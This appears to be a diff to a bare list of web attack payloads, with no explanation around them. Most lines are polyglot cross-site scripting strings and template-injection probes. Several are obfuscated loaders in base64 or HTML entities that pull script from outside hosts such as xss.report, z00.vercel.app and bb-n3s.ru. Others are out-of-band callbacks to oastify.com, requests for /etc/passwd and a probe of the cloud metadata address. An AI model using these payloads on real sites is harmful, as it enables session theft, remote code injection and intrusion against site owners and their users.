@@ -1,12 +1,25 @@
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ${{<%[%'"}}%\
+'),alert()//"><img src=x onerror=alert()
+
 "/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
 
 -->'">"></script><sCript/srC=//xss.report/c/someusername>
 
--->'"/>%0a"><base href=//xss.report/c/someusername><script src='./'></script>
+<iframe srcdoc="&lt;body onload=alert(1)&gt;"></iframe>
 
+\"><sCript/srC=//xss.report/c/someusername>{7*7}${{8*8}}
+
+-->'"/>%0a"><base href=//xss.report/c/someusername><script src='./'></script>
+${{<%[%'"}}%\{% load log %}{% debug %}
+"'\">{{7*'7'}}${3*3},#{3*3},[=3*3]${{7*7}}#{7*7}Go to link<h1><a href='http://asdf.oastify.com'>link</a>test-<!--"
 */ /**/</style></script><script src="https://xss.report/c/someusername"></script>
+
+&#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;
+
+{7*7}${{7*7}}
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\someusername/.source))//>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/someusername&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
 
 <img/src/onerror=alert(document.domain)>
 
@@ -18,6 +31,10 @@ document.head.appendChild(script);
 '"><svg\onload=alert(1)>
 
 &#60;img src=x onerror=alert()&#62;
+
+"a@b.c><script/src='https://xss.report/c/someusername'></script>"@d.e
+
+"a@b.c><script/src='http://bb-n3s.ru/iframe.js'></script>"@d.e
 
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">ПРОМОКОД 70%</a>
 
@@ -43,7 +60,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 
 "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/someusername&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-<script>$.getScript("//xss.report/c/someusername")</script>
+<script>$.getScript("//xss.report/c/someusername")</script>{7*7}${{7*7}}
 
 *//**/"'>--></style></title></textarea></script><iframe height="3000" width="800" src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></iframe><img src=https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd></img>aaa<iframe src="https://bb-n3s.ru/hrtek.php?url=%2fetc%2fpasswd"></script>javascript:eval('var a=document.createElement(\'script\');a.src=\'https://6hougo83ozs076hhfjklz2sonft6h15q.oastify.com\';document.body.appendChild(a)')<script/src=//xss.report/c/someusername></script><iframe/src=http://namebody.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></iframe><iframe/src=//169.254.169.254/></iframe><img/src=https://nameimg.img.r3vf29uoakeltr321466lne990fr3ir7.oastify.com></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(document.cookies)>
 
@@ -185,6 +202,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://z00.ve
 
 *//**/"'>--></style></title></textarea></script><script/src=//z00.vercel.app></script><iframe/src=//z00.vercel.app></iframe><img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img><x="{9*9}\r\n%0A%09%0D<svg\onload=alert(1)> 
 <img src="x" onerror="alert('hello')" />
+
 
 
 2*//**/"'>--></style></title></textarea><svg><x><script>alert('1'&#41</x><SCRscriptIPT>alert(1)</SCRscriptIPT><<script>alert("XSS");//<img/src onerror=\u0061\u006C\u0065\u0072\u0074(1)/></img>
